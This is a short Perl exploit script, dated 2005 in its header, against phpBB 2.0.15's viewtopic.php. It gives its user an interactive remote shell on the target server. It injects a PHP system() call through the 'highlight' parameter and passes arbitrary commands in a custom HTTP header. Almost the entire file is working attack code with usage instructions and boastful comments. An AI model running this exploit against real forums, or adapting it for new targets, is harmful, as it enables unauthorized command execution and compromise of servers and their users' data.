#!/usr/bin/perl 
# Wed Jun 29 19:08:04 CEST 2005 dab@digitalsec.net
#
# phpBB 2.0.15 -re-bug in viewtopic.php
# The complete Open Source Development with CVS: GNU General Public License
# Book on using CVS effectively  <---------  cvs, is also GPL
# or http://www.google.es/search?q=programming+howto
# 
# BLINK! BLINK! BLINK! *** BRUTEFORCE CAPABILITIES *** BLINK! BLINK! BLINK!
# 
# 
# Example: ./phpbb2_0_15.pl http://www.server.com/viewtopic.php?t=1
# You can start typing commands.
# Tested in BSD. Theo.. it works!
#
# !dSR: que todos los hackers digan YO!!
#
# 
 

use strict;
use IO::Socket;

unless ($ARGV[0]) { print "$0 <viewtopic url>\n"; exit(1); }

$ARGV[0] =~ m!http://(.*?)/(.*?t=\d+)!;
my ($server, $port) = split (/:/,$1);
$port   = 80 unless defined($port);
$server  = $1 unless defined($server);
my ($url, $command) = $2;

print "$server - $port - $url\n";

while () {
		print "phpBB2.0.15> ";
		while(<STDIN>) {
				$command=$_;
				chomp($command);
				last;
		}
		&send($command);
}

sub send {
	my $ok		=	0;
	my $cmd		= "echo \"#PHPBBEXPLOIT#\";".$_[0].";echo \"#PHPBBEXPLOIT#\"";
	my $string  = "GET /$url&highlight='.system(getenv(HTTP_PHP)).' HTTP/1.1\n".
					"Host: $server\nPHP: $cmd\n\n\n\n";
	my $socket = IO::Socket::INET->new(PeerAddr => $server,
										PeerPort => $port,
										Proto    => "tcp",
										Type     => SOCK_STREAM)
								or die "can't connect to: $server : $@\n";
	print $socket $string;
	while(<$socket>) {
		if (/#PHPBBEXPLOIT#/) {
				close($socket) and last if $ok eq 2;
				$ok++;
				next;
		}
		print if $ok eq "1";
	}
}
exit 0;

